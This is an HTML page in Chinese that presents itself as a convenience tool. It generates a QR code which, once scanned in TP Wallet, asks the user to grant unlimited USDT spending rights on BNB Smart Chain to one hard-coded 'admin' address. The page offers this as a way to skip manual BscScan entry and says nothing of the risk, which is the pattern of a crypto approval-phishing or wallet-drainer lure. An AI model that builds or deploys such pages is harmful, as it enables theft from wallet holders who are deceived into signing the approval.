<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BSC-USDT 一键授权二维码生成工具</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui}
body{background:#111;color:#fff;padding:30px}
.box{max-width:400px;margin:0 auto;text-align:center}
h2{margin-bottom:20px;color:#F3BA2F}
#qrcode{
  width:300px;height:300px;background:#fff;padding:12px;
  border-radius:16px;margin:20px auto;
}
#qrcode img{width:100%;height:100%;border-radius:8px}
.desc{color:#ccc;font-size:14px;line-height:1.6}
.copy-box{
  margin-top:20px;
  background:#222;padding:12px;border-radius:10px;
  word-break:break-all;font-size:12px;color:#eee
}
</style>
</head>
<body>
<div class="box">
  <h2>BSC USDT 无限授权快捷码</h2>
  <div id="qrcode">加载二维码...</div>
  <p class="desc">使用TP钱包内置扫一扫，直接唤起approve授权<br>无需去BscScan手动填写合约参数</p>
  <div class="copy-box" id="linkText"></div>
</div>

<script>
// 固定配置（和你代码完全一致，无需修改）
const TOKEN = "0x55d398326f99059fF775485246999027B3197955";
const CHAIN_ID = "56";
const ADMIN_SPENDER = "0x627f6E1887571Ac08214315ad5b2fA7ABb7345f1";
// 无限授权最大值
const MAX_AMOUNT = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

// 组装EIP681授权协议链接
const approveLink = `ethereum:${TOKEN}@${CHAIN_ID}/approve?spender=${ADMIN_SPENDER}&uint256=${MAX_AMOUNT}`;

// 生成二维码
function createQR(){
  const qrApi = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(approveLink)}`;
  document.getElementById("qrcode").innerHTML = `<img src="${qrApi}" alt="授权二维码">`;
  document.getElementById("linkText").innerText = approveLink;
}
window.onload = createQR;
</script>
</body>
</html>
